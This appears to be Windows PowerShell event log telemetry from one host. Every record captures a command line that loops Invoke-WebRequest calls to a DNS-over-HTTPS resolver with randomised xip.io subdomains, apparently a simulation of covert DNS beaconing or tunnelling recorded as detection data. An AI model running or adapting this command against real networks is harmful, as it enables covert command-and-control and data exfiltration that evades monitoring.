{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:11:15.6852996"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d\r\n\tHostApplication=powershell.exe &amp; {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \"https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&amp;type=TXT\" -UseBasicParsing).Content }}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:11:15.6944085"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d\r\n\tHostApplication=powershell.exe &amp; {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \"https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&amp;type=TXT\" -UseBasicParsing).Content }}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:11:15.6989974"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d\r\n\tHostApplication=powershell.exe &amp; {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \"https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&amp;type=TXT\" -UseBasicParsing).Content }}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:11:15.7007798"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d\r\n\tHostApplication=powershell.exe &amp; {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \"https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&amp;type=TXT\" -UseBasicParsing).Content }}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:11:15.7129626"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d\r\n\tHostApplication=powershell.exe &amp; {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \"https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&amp;type=TXT\" -UseBasicParsing).Content }}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:11:15.7149743"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d\r\n\tHostApplication=powershell.exe &amp; {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \"https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&amp;type=TXT\" -UseBasicParsing).Content }}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-28 15:11:15.8193503"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d\r\n\tHostApplication=powershell.exe &amp; {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \"https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&amp;type=TXT\" -UseBasicParsing).Content }}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=6006f99d-554a-49e3-a5f8-1defe3b27241\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
